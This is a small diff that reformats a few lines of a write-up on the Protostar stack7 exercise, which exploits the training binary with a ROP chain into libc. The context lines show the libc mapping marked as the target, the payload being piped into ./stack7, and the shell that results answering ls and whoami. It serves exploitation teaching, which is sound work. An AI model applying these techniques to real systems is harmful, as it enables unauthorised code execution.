@@ -811,7 +811,7 @@ http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack
 Lets check out EXECVE by looking at the man page:
 ```bash
 le91688:$ man execve
-EXECVE(2)                                             Linux Programmer's Manual                                             EXECVE(2)
+EXECVE(2)                                             Linux Programmer's Manual                           EXECVE(2)
 
 NAME
        execve - execute program
@@ -924,7 +924,7 @@ le91688:~/workspace/proto (master) $ cat /proc/29658/maps
 55577000-55579000 r--p 00000000 00:00 0                                  [vvar]
 55579000-5557a000 r-xp 00000000 00:00 0                                  [vdso]
 5557a000-5557c000 rwxp 00000000 00:00 0 
-5558e000-55736000 r-xp 00000000 00:245 9410                              /lib/i386-linux-gnu/libc-2.19.so   <-- Target
+5558e000-55736000 r-xp 00000000 00:245 9410   Target------------->       /lib/i386-linux-gnu/libc-2.19.so   
 55736000-55737000 ---p 001a8000 00:245 9410                              /lib/i386-linux-gnu/libc-2.19.so
 55737000-55739000 r-xp 001a8000 00:245 9410                              /lib/i386-linux-gnu/libc-2.19.so
 55739000-5573a000 rwxp 001aa000 00:245 9410                              /lib/i386-linux-gnu/libc-2.19.so
@@ -1002,7 +1002,7 @@ le91688:~/workspace/proto$ python ./ropchain.py
 le91688:~/workspace/proto$ (cat testrop; cat) | ./stack7
 input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaXUaaaaaaaabbbbXU
 ls
-LIBCgadgets             format0          format3    heap4.asm    stack0.s          stack3exploit.py    stack6.asm      ...
+LIBCgadgets             format0          format3    heap4.asm    stack0.s          stack3exploit.py    ...
 whoami
 ubuntu
 ```
